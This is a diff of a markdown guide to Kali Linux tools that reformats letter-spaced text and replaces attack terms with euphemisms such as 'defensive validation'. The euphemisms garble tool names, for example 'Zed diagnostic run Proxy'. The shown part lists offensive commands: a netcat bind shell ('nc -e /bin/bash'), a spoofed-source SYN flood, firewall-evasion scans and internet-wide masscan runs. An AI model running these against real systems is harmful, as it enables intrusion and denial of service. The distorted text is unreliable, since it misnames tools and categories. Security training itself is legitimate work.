@@ -10,15 +10,13 @@ readingTime: "168 min read"
 ---
 
 # 50 Kali Linux tools MY compressed
-
 > [!IMPORTANT]
 > **Defensive & Authorized Auditing Purposes Only**
 > This note is prepared for educational and authorized defensive diagnostics, infrastructure auditing, and host hardening purposes only. Unauthorised access, penetration tests without written consent, or execution of security commands on external networks is illegal.
-
 Top 50 Kali Linux Tools: Comprehensive Guide for Security
-Professionals  
-I n t r o d u c t i o n
-U n d e r s t a n d i n g  t h e  K a l i  L i n u x  S e c u r i t y  E c o s y s t e m  
+Professionals
+Introduction
+Understanding the Kali Linux Security Ecosystem
 4
 4
 4
@@ -59,87 +57,87 @@ U n d e r s t a n d i n g  t h e  K a l i  L i n u x  S e c u r i t y  E c o s y
 2 0
 2 1
 2 1
-2 1  
-K a l i  T o o l  C a t e g o r i e s  a n d  A r c h i t e c t u r e  
-N e t w o r k  A n a l y s i s  a n d  S c a n n i n g  T o o l s  
+2 1
+Kali Tool Categories and Architecture
+Network Analysis and Scanning Tools
 1 .  N m a p  ( N e t w o r k  M a p p e r )
-2 .  M a s s c a n
+2 . Masscan
 3 .  N e t c a t  ( n c )
-4 .  W i r e s h a r k
-5 .  H p i n g 3  
-W e b  A p p l i c a t i o n  T e s t i n g  T o o l s  
-6 .  B u r p  S u i t e
+4 . Wireshark
+5 .  H p i n g 3
+Web Application Testing Tools
+6 . Burp Suite
 7 .  O W A S P  Z A P  ( Z e d  A t t a c k  P r o x y )
-8 .  S Q L M a p
-9 .  N i k t o
-1 0 .  D i r b / D i r b u s t e r  
-W i r e l e s s  S e c u r i t y  T e s t i n g  T o o l s  
-1 1 .  A i r c r a c k - n g  S u i t e
+8 . SQLMap
+9 . Nikto
+1 0 .  D i r b / D i r b u s t e r
+Wireless Security Testing Tools
+1 1 . A i r c r a c k - n g Suite
 1 2 .  R e a v e r / B u l l y
-1 3 .  W i f i t e  
-E x p l o i t a t i o n  F r a m e w o r k  T o o l s
-1 4 .  M e t a s p l o i t  F r a m e w o r k
+1 3 . Wifite
+defensive validation Framework Tools
+1 4 . Metasploit Framework
 1 5 .  B e E F  ( B r o w s e r  E x p l o i t a t i o n  F r a m e w o r k )
-1 6 .  S o c i a l  E n g i n e e r i n g  T o o l k i t  ( S E T )  
-P a s s w o r d  C r a c k i n g  a n d  A n a l y s i s  T o o l s  
-1 7 .  J o h n  t h e  R i p p e r
-1 8 .  H a s h c a t
+1 6 .  S o c i a l  E n g i n e e r i n g  T o o l k i t  ( S E T )
+Password Cracking and Analysis Tools
+1 7 . John the Ripper
+1 8 . Hashcat
 1 9 .  H y d r a
-2 0 .  M e d u s a  
-V u l n e r a b i l i t y  A n a l y s i s  T o o l s  
-2 1 .  O p e n V A S
+2 0 . Medusa
+Vulnerability Analysis Tools
+2 1 . OpenVAS
 2 2 .  L y n i s
-2 3 .  W a p i t i  
-F o r e n s i c s  a n d  I n f o r m a t i o n  G a t h e r i n g  T o o l s  
-2 4 .  M a l t e g o
+2 3 . Wapiti
+Forensics and Information Gathering Tools
+2 4 . Maltego
 2 5 .  R e c o n - n g
-2 6 .  t h e H a r v e s t e r
-2 7 .  D m i t r y
-2 8 .  F o r e n s i c s  T o o l k i t  ( A u t o p s y / S l e u t h  K i t )  
-R e v e r s e  E n g i n e e r i n g  T o o l s  
-2 9 .  G h i d r a
-3 0 .  R a d a r e 2  
-3 1 .  G D B  ( w i t h  P E D A / G E F / p w n d b g )  
-E x p l o i t a t i o n  D e v e l o p m e n t  T o o l s  
+2 6 . theHarvester
+2 7 . Dmitry
+2 8 .  F o r e n s i c s  T o o l k i t  ( A u t o p s y / S l e u t h  K i t )
+Reverse Engineering Tools
+2 9 . Ghidra
+3 0 .  R a d a r e 2
+3 1 .  G D B  ( w i t h  P E D A / G E F / p w n d b g )
+defensive validation Development Tools
 3 2 .  M S F V e n o m  3 3 .
-S e a r c h s p l o i t  3 4 .  P a t t e r n
-C r e a t e / O f f s e t  
-N e t w o r k  S p o o f i n g  a n d  M I T M  T o o l s  
-3 5 .  E t t e r c a p
-3 6 .  B e t t e r c a p
-3 7 .  R e s p o n d e r  
-M o b i l e  S e c u r i t y  T e s t i n g  T o o l s  
+Searchsploit 3 4 . Pattern
+C r e a t e / O f f s e t
+Network Spoofing and MITM Tools
+3 5 . Ettercap
+3 6 . Bettercap
+3 7 . Responder
+Mobile Security Testing Tools
 3 8 .  A n d r o i d  D e b u g  B r i d g e  ( A D B )  3 9 .
 M o b S F  ( M o b i l e  S e c u r i t y  F r a m e w o r k )  4 0 .
-F r i d a  
-C r y p t o g r a p h y  a n d  S t e g a n o g r a p h y  T o o l s  
-4 1 .  H a s h i d e n t i f i e r
+Frida
+Cryptography and Steganography Tools
+4 1 . Hashidentifier
 4 2 .  S t e g h i d e  4 3 .
-B i n w a l k  
-P o s t - E x p l o i t a t i o n  T o o l s  
+Binwalk
+P o s t - E x p l o i t a t i o n Tools
 4 4 .  M i m i k a t z  4 5 .
-P o w e r S p l o i t  4 6 .
-E v i l - W i n R M  
-R e p o r t i n g  a n d  D o c u m e n t a t i o n  T o o l s  
+PowerSploit 4 6 .
+E v i l - W i n R M
+Reporting and Documentation Tools
 4 7 .  D r a d i s  4 8 .
-F a r a d a y  4 9 .
-C h e r r y T r e e  5 0 .
-P i p a l  
-A d v a n c e d  T o o l  I n t e g r a t i o n  a n d  A u t o m a t i o n  
-C o m b i n i n g  T o o l s  f o r  C o m p r e h e n s i v e  A s s e s s m e n t s
-C u s t o m  T o o l  D e v e l o p m e n t  
-B e s t  P r a c t i c e s  f o r  K a l i  L i n u x  T o o l  U s a g e  
-L e g a l  a n d  E t h i c a l  C o n s i d e r a t i o n s
-T o o l  S e l e c t i o n  S t r a t e g y  
-C o n c l u s i o n  F r e q u e n t l y  A s k e d
-Q u e s t i o n s  
-W h i c h  K a l i  L i n u x  t o o l s  s h o u l d  b e g i n n e r s  f o c u s  o n  f i r s t ?  H o w  c a n  I  p r a c t i c e  u s i n g
-K a l i  L i n u x  t o o l s  l e g a l l y  a n d  s a f e l y ?  W h a t  a r e  t h e  e s s e n t i a l  d i f f e r e n c e s  b e t w e e n
-K a l i  L i n u x  t o o l s  f o r  d i f f e r e n t  t e s t i n g  
-p h a s e s ?  
-H o w  d o  I  c h o o s e  b e t w e e n  s i m i l a r  t o o l s  i n  K a l i  L i n u x ?  
-W h a t  a r e  t h e  m o s t  c o m m o n  m i s t a k e s  w h e n  u s i n g  K a l i  L i n u x  t o o l s ?  
-R e l a t e d  A r t i c l e s  a n d  R e s o u r c e s  
+Faraday 4 9 .
+CherryTree 5 0 .
+Pipal
+Advanced Tool Integration and Automation
+Combining Tools for Comprehensive Assessments
+Custom Tool Development
+Best Practices for Kali Linux Tool Usage
+Legal and Ethical Considerations
+Tool Selection Strategy
+Conclusion Frequently Asked
+Questions
+Which Kali Linux tools should beginners focus on f i r s t ? How can I practice using
+Kali Linux tools legally and s a f e l y ? What are the essential differences between
+Kali Linux tools for different testing
+p h a s e s ?
+How do I choose between similar tools in Kali L i n u x ?
+What are the most common mistakes when using Kali Linux t o o l s ?
+Related Articles and Resources
 2 2
 2 3
 2 3
@@ -175,1339 +173,1219 @@ R e l a t e d  A r t i c l e s  a n d  R e s o u r c e s
 3 7
 3 7
 3 7
-3 8  
-3 9  
-4 0  
-4 1  
-4 2  
-I n t r o d u c t i o n  
+3 8
+3 9
+4 0
+4 1
+4 2
+Introduction
 This categorization helps security professionals select appropriate tools for
-specific assessment phases, from initial reconnaissance through exploitation
-and post-exploitation activities.  
+specific assessment phases, from initial reconnaissance through defensive validation
+and post-defensive validation activities.
 The Kali Linux toolkit is organized into distinct categories, each serving specific
-security assessment needs:  
+security assessment needs:
 Kali Linux has established itself as the premier penetration testing and security
 auditing platform, bundling over 600 security tools in a single distribution.
 Originally developed from BackTrack Linux, Kali provides security professionals,
-ethical hackers, and penetration testers with a comprehensive toolkit for
+security analyst, and penetration testers with a comprehensive toolkit for
 assessing and improving security postures. This technical deep-dive explores
 the 50 most essential Kali Linux tools, examining their capabilities, practical
 applications, and advanced usage patterns that distinguish professional security
 assessments from amateur attempts. Understanding these tools' proper
 implementation is crucial for conducting thorough security evaluations while
-maintaining ethical and legal compliance.  
-N e t w o r k  A n a l y s i s  a n d  S c a n n i n g  T o o l s  
-U n d e r s t a n d i n g  t h e  K a l i  L i n u x  S e c u r i t y  E c o s y s t e m  
-Kali Tool Categories and Architecture  
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  
-│  
-K a l i  L i n u x  T o o l  C a t e g o r i e s  
-│  
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-│
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┼ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  
-▼  
-▼  
-▼  
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐
-│  V u l n e r a b i l i t y  │  
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  
-│  I n f o r m a t i o n
-│  G a t h e r i n g
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-│
-│  
+maintaining ethical and legal compliance.
+Network Analysis and Scanning Tools
+Understanding the Kali Linux Security Ecosystem
+Kali Tool Categories and Architecture
+Kali Linux Tool Categories
+│ Vulnerability │
+│ Information
+│ Gathering
 │  W e b
-│  A p p l i c a t i o n s  
-│
-│
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-│  A n a l y s i s
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-│  
-│
-▼  
-│
-▼  
-│
-▼  
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  
-│  W i r e l e s s
-│  A t t a c k s
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-│
-│  
-│  E x p l o i t a t i o n
-│  T o o l s
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-│
-│  
-│  F o r e n s i c s
-│  T o o l s  
-│
-│
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-│
-▼  
-│
-▼  
-│
-▼  
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  
-│  P a s s w o r d
-│  A t t a c k s
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-│
-│  
-│  R e v e r s e
-│  E n g i n e e r i n g
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-│
-│  
-│  S o c i a l
-│  E n g i n e e r i n g  
-│
-│
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-
-2. Masscan  
-1. Nmap (Network Mapper)  
+│ Applications
+│ Analysis
+│ Wireless
+│ security test
+│ defensive validation
+│ Tools
+│ Forensics
+│ Tools
+│ Password
+│ security test
+│ Reverse
+│ Engineering
+│ Social
+│ Engineering
+2. Masscan
+1. Nmap (Network Mapper)
 Masscanprovides Internet-scale port scanning capabilities with extraordinary
-speed:  
+speed:
 Nmap remainsthegoldstandard fornetwork discovery and security auditing,
-offering unparalleled flexibility in network reconnaissance:  
-#  H i g h - s p e e d  p o r t  s c a n n i n g
-m a s s c a n  - p 1 - 6 5 5 3 5  1 9 2 . 1 6 8 . 1 . 0 / 2 4  - - r a t e = 1 0 0 0  
-#  B a n n e r  g r a b b i n g  w i t h  o u t p u t  f o r m a t t i n g
+offering unparalleled flexibility in network reconnaissance:
+# H i g h - s p e e d port scanning
+m a s s c a n  - p 1 - 6 5 5 3 5  1 9 2 . 1 6 8 . 1 . 0 / 2 4  - - r a t e = 1 0 0 0
+# Banner grabbing with output formatting
 m a s s c a n  - p 8 0 , 4 4 3 , 4 4 5 , 2 2  1 0 . 0 . 0 . 0 / 8  - - b a n n e r s  - - s o u r c e - p o r t  6 1 0 0 0  - o J
-s c a n _ r e s u l t s . j s o n  
-#  E x c l u d e  r a n g e s  a n d  r a t e  l i m i t i n g
-m a s s c a n  0 . 0 . 0 . 0 / 0  - p 8 0 , 4 4 3  - - e x c l u d e f i l e  e x c l u d e . t x t  - - r a t e = 1 0 0 0 0 0  
-#  C u s t o m  p a c k e t  c r a f t i n g
+s c a n _ r e s u l t s . j s o n
+# Exclude ranges and rate limiting
+m a s s c a n  0 . 0 . 0 . 0 / 0  - p 8 0 , 4 4 3  - - e x c l u d e f i l e  e x c l u d e . t x t  - - r a t e = 1 0 0 0 0 0
+# Custom packet crafting
 m a s s c a n  - - p o r t s  0 - 6 5 5 3 5  - - a d a p t e r - i p  1 9 2 . 1 6 8 . 1 . 1 0 0  - - r o u t e r - m a c
-0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  1 9 2 . 1 6 8 . 1 . 0 / 2 4  
-#  C o m p r e h e n s i v e  n e t w o r k  s c a n  w i t h  s e r v i c e  d e t e c t i o n
-n m a p  - s V  - s C  - O  - A  - T 4  1 9 2 . 1 6 8 . 1 . 0 / 2 4  
-#  S t e a l t h  S Y N  s c a n  w i t h  t i m i n g  o p t i m i z a t i o n
-n m a p  - s S  - T 2  - p -  - - m a x - r e t r i e s  1  - - m i n - r a t e  1 0 0  t a r g e t . c o m  
-#  S c r i p t - b a s e d  v u l n e r a b i l i t y  s c a n n i n g
-n m a p  - - s c r i p t  v u l n  - - s c r i p t - a r g s = u n s a f e = 1  1 9 2 . 1 6 8 . 1 . 1 0 0  
-#  A d v a n c e d  f i r e w a l l  e v a s i o n  t e c h n i q u e s
-n m a p  - s S  - f  - - m t u  2 4  - - d a t a - l e n g t h  1 3 3 7  - D  R N D : 1 0  - - s p o o f - m a c  0  1 9 2 . 1 6 8 . 1 . 1  
-#  C u s t o m  N S E  s c r i p t  e x e c u t i o n
+0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  1 9 2 . 1 6 8 . 1 . 0 / 2 4
+# Comprehensive network scan with service detection
+n m a p  - s V  - s C  - O  - A  - T 4  1 9 2 . 1 6 8 . 1 . 0 / 2 4
+# Stealth SYN scan with timing optimization
+nmap - s S - T 2 - p - - - m a x - r e t r i e s 1 - - m i n - r a t e 1 0 0 t a r g e t . c o m
+# S c r i p t - b a s e d vulnerability scanning
+n m a p  - - s c r i p t  v u l n  - - s c r i p t - a r g s = u n s a f e = 1  1 9 2 . 1 6 8 . 1 . 1 0 0
+# Advanced firewall evasion techniques
+n m a p  - s S  - f  - - m t u  2 4  - - d a t a - l e n g t h  1 3 3 7  - D  R N D : 1 0  - - s p o o f - m a c  0  1 9 2 . 1 6 8 . 1 . 1
+# Custom NSE script execution
 n m a p  - - s c r i p t = h t t p - v u l n - *  - - s c r i p t - a r g s
-h t t p - v u l n - c v e 2 0 1 7 - 5 6 3 8 . p a t h = / s t r u t s 2 - s h o w c a s e /  1 9 2 . 1 6 8 . 1 . 1 0 0  
-#  U D P  s e r v i c e  d i s c o v e r y
-n m a p  - s U  - s V  - - v e r s i o n - i n t e n s i t y  0  - n  - T 4  1 9 2 . 1 6 8 . 1 . 0 / 2 4  
-#  I P v 6  s c a n n i n g
-n m a p  - 6  - s S  - p  8 0 , 4 4 3 , 2 2 , 2 1 , 2 5  2 0 0 1 : d b 8 : : / 3 2  
-
-4. Wireshark  
-3. Netcat (nc)  
-Thepremierpacket analysis tool for deep network inspection:  
-The"SwissArmyknife" of networking tools, essential for various security tasks:  
-#  R e v e r s e  s h e l l  l i s t e n e r
-n c  - n l v p  4 4 4 4  
-#  C o n n e c t  t o  r e m o t e  p o r t
-n c  - n v  1 9 2 . 1 6 8 . 1 . 1 0 0  8 0  
-#  P o r t  s c a n n i n g
-n c  - z v n  1 9 2 . 1 6 8 . 1 . 1 0 0  1 - 1 0 0 0  2 &gt; & 1  |  g r e p  s u c c e e d e d  
-#  F i l e  t r a n s f e r
-#  R e c e i v e r :
-n c  - l  - p  1 2 3 4  &gt;  r e c e i v e d _ f i l e . t x t
-#  S e n d e r :
-n c  - w  3  1 9 2 . 1 6 8 . 1 . 1 0 0  1 2 3 4  <  f i l e _ t o _ s e n d . t x t  
+h t t p - v u l n - c v e 2 0 1 7 - 5 6 3 8 . p a t h = / s t r u t s 2 - s h o w c a s e /  1 9 2 . 1 6 8 . 1 . 1 0 0
+# UDP service discovery
+n m a p  - s U  - s V  - - v e r s i o n - i n t e n s i t y  0  - n  - T 4  1 9 2 . 1 6 8 . 1 . 0 / 2 4
+# I P v 6 scanning
+n m a p  - 6  - s S  - p  8 0 , 4 4 3 , 2 2 , 2 1 , 2 5  2 0 0 1 : d b 8 : : / 3 2
+4. Wireshark
+3. Netcat (nc)
+Thepremierpacket analysis tool for deep network inspection:
+The"SwissArmyknife" of networking tools, essential for various security tasks:
+# unauthorized remote shell activity listener
+n c  - n l v p  4 4 4 4
+# Connect to remote port
+n c  - n v  1 9 2 . 1 6 8 . 1 . 1 0 0  8 0
+# Port scanning
+n c  - z v n  1 9 2 . 1 6 8 . 1 . 1 0 0  1 - 1 0 0 0  2 &gt; & 1  |  g r e p  s u c c e e d e d
+# File transfer
+# R e c e i v e r :
+nc - l - p 1 2 3 4 &gt; r e c e i v e d _ f i l e . t x t
+# S e n d e r :
+n c  - w  3  1 9 2 . 1 6 8 . 1 . 1 0 0  1 2 3 4  &lt;  f i l e _ t o _ s e n d . t x t
 #  C r e a t e  b a c k d o o r  ( e d u c a t i o n a l  p u r p o s e  o n l y )
-n c  - l  - p  4 4 4 4  - e  / b i n / b a s h  
-#  U D P  c o n n e c t i o n s
-n c  - u  - l  - p  1 2 3 4  
-#  H T T P  r e q u e s t  c r a f t i n g
-e c h o  - e  " G E T  /  H T T P / 1 . 1 \ r \ n H o s t :  t a r g e t . c o m \ r \ n \ r \ n "  |  n c  t a r g e t . c o m  8 0  
-#  C a p t u r e  f i l t e r s  f o r  s p e c i f i c  t r a f f i c
-w i r e s h a r k  - i  e t h 0  - f  " t c p  p o r t  8 0  a n d  h o s t  1 9 2 . 1 6 8 . 1 . 1 0 0 "  
-#  D i s p l a y  f i l t e r s  f o r  a n a l y s i s
-#  H T T P  t r a f f i c :  h t t p
+n c  - l  - p  4 4 4 4  - e  / b i n / b a s h
+# UDP connections
+n c  - u  - l  - p  1 2 3 4
+# HTTP request crafting
+e c h o  - e  " G E T  /  H T T P / 1 . 1 \ r \ n H o s t :  t a r g e t . c o m \ r \ n \ r \ n "  |  n c  t a r g e t . c o m  8 0
+# Capture filters for specific traffic
+w i r e s h a r k  - i  e t h 0  - f  " t c p  p o r t  8 0  a n d  h o s t  1 9 2 . 1 6 8 . 1 . 1 0 0 "
+# Display filters for analysis
+# HTTP t r a f f i c : http
 #  H T T P S  h a n d s h a k e s :  s s l . h a n d s h a k e . t y p e  = =  1
 #  D N S  q u e r i e s :  d n s . f l a g s . r e s p o n s e  = =  0
-#  S Y N  p a c k e t s :  t c p . f l a g s . s y n  = =  1  & &  t c p . f l a g s . a c k  = =  0  
-#  C o m m a n d - l i n e  c a p t u r e  w i t h  t s h a r k
+#  S Y N  p a c k e t s :  t c p . f l a g s . s y n  = =  1  & &  t c p . f l a g s . a c k  = =  0
+# C o m m a n d - l i n e capture with tshark
 t s h a r k  - i  e t h 0  - Y  " h t t p . r e q u e s t . m e t h o d  = =  P O S T "  - T  f i e l d s  - e  h t t p . h o s t  - e
-h t t p . r e q u e s t . u r i  
-#  E x t r a c t  f i l e s  f r o m  p a c k e t  c a p t u r e
-t s h a r k  - r  c a p t u r e . p c a p  - - e x p o r t - o b j e c t s  " h t t p , e x t r a c t e d _ f i l e s "  
-
-#  L a u n c h  B u r p  S u i t e
-b u r p s u i t e  
-#  C o n f i g u r e  p r o x y  s e t t i n g s
+h t t p . r e q u e s t . u r i
+# Extract files from packet capture
+tshark - r c a p t u r e . p c a p - - e x p o r t - o b j e c t s " h t t p , e x t r a c t e d _ f i l e s "
+# Launch Burp Suite
+burpsuite
+# Configure proxy settings
 #  B r o w s e r :  1 2 7 . 0 . 0 . 1 : 8 0 8 0
-#  B u r p :  P r o x y  - &gt;  O p t i o n s  - &gt;  R u n n i n g :  1 2 7 . 0 . 0 . 1 : 8 0 8 0  
-#  I n t r u d e r  a t t a c k  c o n f i g u r a t i o n  e x a m p l e
+#  B u r p :  P r o x y  - &gt;  O p t i o n s  - &gt;  R u n n i n g :  1 2 7 . 0 . 0 . 1 : 8 0 8 0
+# Intruder security test configuration example
 #  P o s i t i o n :  u s e r n a m e = § a d m i n § & p a s s w o r d = § p a s s w o r d §
-#  P a y l o a d s :  C u s t o m  w o r d l i s t  o r  r u n t i m e  g e n e r a t i o n
-#  O p t i o n s :  F o l l o w  r e d i r e c t s ,  s t o r e  r e s p o n s e s  
-#  S Y N  f l o o d  t e s t i n g
-h p i n g 3  - c  1 0 0 0 0  - d  1 2 0  - S  - w  6 4  - p  8 0  - - f l o o d  - - r a n d - s o u r c e  t a r g e t . c o m  
-#  T r a c e r o u t e  u s i n g  d i f f e r e n t  p r o t o c o l s
-h p i n g 3  - - t r a c e r o u t e  - V  - S  - p  8 0  t a r g e t . c o m  
-#  P o r t  s c a n n i n g  w i t h  c u s t o m  f l a g s
-h p i n g 3  - 8  5 0 - 6 0  - S  - V  t a r g e t . c o m  
-#  F i r e w a l l  t e s t i n g  w i t h  f r a g m e n t a t i o n
-h p i n g 3  - f  - p  8 0  - S  t a r g e t . c o m  
-#  T i m e s t a m p  c o l l e c t i o n
-h p i n g 3  - S  - p  8 0  - - t c p - t i m e s t a m p  t a r g e t . c o m  
-#  C u s t o m  p a c k e t  w i t h  d a t a
-h p i n g 3  - p  8 0  - S  - d  5 0  - E  m a l i c i o u s . t x t  t a r g e t . c o m  
-#  R e a l - t i m e  s t a t i s t i c s
-t s h a r k  - i  e t h 0  - q  - z  i o , s t a t , 1  
-#  D e c r y p t  H T T P S  t r a f f i c  w i t h  k e y
-w i r e s h a r k  - o  " s s l . k e y s _ l i s t : 1 9 2 . 1 6 8 . 1 . 1 0 0 , 4 4 3 , h t t p , s e r v e r . k e y "  - r  c a p t u r e . p c a p  
-5. Hping3  
-6. Burp Suite  
-Advancedpacket crafting tool for security testing:  
-Theindustry-standard web application security testing platform:  
-W e b  A p p l i c a t i o n  T e s t i n g  T o o l s  
-
-#  S c a n n e r  c o n f i g u r a t i o n  f o r  a u t h e n t i c a t e d  s c a n n i n g
+# P a y l o a d s : Custom wordlist or runtime generation
+# O p t i o n s : Follow r e d i r e c t s , store responses
+# SYN flood testing
+h p i n g 3  - c  1 0 0 0 0  - d  1 2 0  - S  - w  6 4  - p  8 0  - - f l o o d  - - r a n d - s o u r c e  t a r g e t . c o m
+# Traceroute using different protocols
+h p i n g 3 - - t r a c e r o u t e - V - S - p 8 0 t a r g e t . c o m
+# Port scanning with custom flags
+h p i n g 3  - 8  5 0 - 6 0  - S  - V  t a r g e t . c o m
+# Firewall testing with fragmentation
+h p i n g 3 - f - p 8 0 - S t a r g e t . c o m
+# Timestamp collection
+h p i n g 3 - S - p 8 0 - - t c p - t i m e s t a m p t a r g e t . c o m
+# Custom packet with data
+h p i n g 3 - p 8 0 - S - d 5 0 - E m a l i c i o u s . t x t t a r g e t . c o m
+# R e a l - t i m e statistics
+tshark - i e t h 0 - q - z i o , s t a t , 1
+# Decrypt HTTPS traffic with key
+w i r e s h a r k  - o  " s s l . k e y s _ l i s t : 1 9 2 . 1 6 8 . 1 . 1 0 0 , 4 4 3 , h t t p , s e r v e r . k e y "  - r  c a p t u r e . p c a p
+5. Hping3
+6. Burp Suite
+Advancedpacket crafting tool for security testing:
+Theindustry-standard web application security testing platform:
+Web Application Testing Tools
+# Scanner configuration for authenticated scanning
 #  S e s s i o n  h a n d l i n g  r u l e s  f o r  c o o k i e / t o k e n  m a n a g e m e n t
-#  S c o p e  d e f i n i t i o n  f o r  t a r g e t e d  s c a n n i n g
-#  P a s s i v e / A c t i v e  s c a n  o p t i m i z a t i o n  
+# Scope definition for targeted scanning
+#  P a s s i v e / A c t i v e  s c a n  o p t i m i z a t i o n
 #  E x t e n s i o n  u s a g e  ( P y t h o n  e x a m p l e )
-f r o m  b u r p  i m p o r t  I B u r p E x t e n d e r ,  I H t t p L i s t e n e r  
-c l a s s  B u r p E x t e n d e r ( I B u r p E x t e n d e r ,  I H t t p L i s t e n e r ) :  
-d e f  r e g i s t e r E x t e n d e r C a l l b a c k s ( s e l f ,  c a l l b a c k s ) :  
+from burp import I B u r p E x t e n d e r , IHttpListener
+c l a s s  B u r p E x t e n d e r ( I B u r p E x t e n d e r ,  I H t t p L i s t e n e r ) :
+d e f  r e g i s t e r E x t e n d e r C a l l b a c k s ( s e l f ,  c a l l b a c k s ) :
 s e l f . _ c a l l b a c k s  =  c a l l b a c k s
 c a l l b a c k s . s e t E x t e n s i o n N a m e ( " C u s t o m  S e c u r i t y  S c a n n e r " )
-c a l l b a c k s . r e g i s t e r H t t p L i s t e n e r ( s e l f )  
-d e f  p r o c e s s H t t p M e s s a g e ( s e l f ,  t o o l F l a g ,  m e s s a g e I s R e q u e s t ,  m e s s a g e I n f o ) :  
-i f  m e s s a g e I s R e q u e s t :  
+c a l l b a c k s . r e g i s t e r H t t p L i s t e n e r ( s e l f )
+d e f  p r o c e s s H t t p M e s s a g e ( s e l f ,  t o o l F l a g ,  m e s s a g e I s R e q u e s t ,  m e s s a g e I n f o ) :
+if m e s s a g e I s R e q u e s t :
 r e q u e s t  =  m e s s a g e I n f o . g e t R e q u e s t ( )
-#  C u s t o m  s e c u r i t y  c h e c k s  
-#  S t a r t  Z A P  i n  d a e m o n  m o d e
-z a p . s h  - d a e m o n  - p o r t  8 0 9 0  - h o s t  0 . 0 . 0 . 0  
-#  C o m m a n d - l i n e  q u i c k  s c a n
+# Custom security checks
+# Start ZAP in daemon mode
+z a p . s h  - d a e m o n  - p o r t  8 0 9 0  - h o s t  0 . 0 . 0 . 0
+# C o m m a n d - l i n e quick scan
 z a p - c l i  - - z a p - u r l  h t t p : / / 1 2 7 . 0 . 0 . 1 : 8 0 9 0  - p  8 0 9 0  q u i c k - s c a n  - s  a l l  - r
-h t t p : / / t a r g e t . c o m  
-#  A c t i v e  s c a n  w i t h  a u t h e n t i c a t i o n
-z a p - c l i  a c t i v e - s c a n  - s  a l l  - r  h t t p : / / t a r g e t . c o m  - c  " s e s s i o n = a b c 1 2 3 "  
-#  A P I  u s a g e  f o r  a u t o m a t i o n
-c u r l
+h t t p : / / t a r g e t . c o m
+# Active scan with authentication
+z a p - c l i  a c t i v e - s c a n  - s  a l l  - r  h t t p : / / t a r g e t . c o m  - c  " s e s s i o n = a b c 1 2 3 "
+# API usage for automation
+curl
 h t t p : / / l o c a l h o s t : 8 0 9 0 / J S O N / a s c a n / a c t i o n / s c a n / ? u r l = h t t p : / / t a r g e t . c o m & r e c u r s e = t r u e
-& i n S c o p e O n l y = f a l s e  
-#  G e n e r a t e  r e p o r t s
-z a p - c l i  r e p o r t  - o  z a p _ r e p o r t . h t m l  - f  h t m l  
-#  S p i d e r  w i t h  A J A X  s u p p o r t
-z a p - c l i  a j a x - s p i d e r  h t t p : / / t a r g e t . c o m  
-8. SQLMap  
-7. OWASP ZAP (Zed diagnostic run Proxy)  
+& i n S c o p e O n l y = f a l s e
+# Generate reports
+z a p - c l i report - o z a p _ r e p o r t . h t m l - f html
+# Spider with AJAX support
+z a p - c l i  a j a x - s p i d e r  h t t p : / / t a r g e t . c o m
+8. SQLMap
+7. OWASP ZAP (Zed diagnostic run Proxy)
 Open-sourcewebapplicationsecurityscanner:
-
-Web server vulnerability scanner:  
-Automated SQL injection detection and exploitation tool:  
-#  C o m p r e h e n s i v e  s c a n
-n i k t o  - h  h t t p : / / t a r g e t . c o m  - o  n i k t o _ r e p o r t . h t m l  - F o r m a t  h t m  
-#  S c a n  w i t h  s p e c i f i c  p l u g i n s
-n i k t o  - h  h t t p : / / t a r g e t . c o m  - P l u g i n s  " a p a c h e _ e x p e c t _ x s s , s u b d o m a i n "  
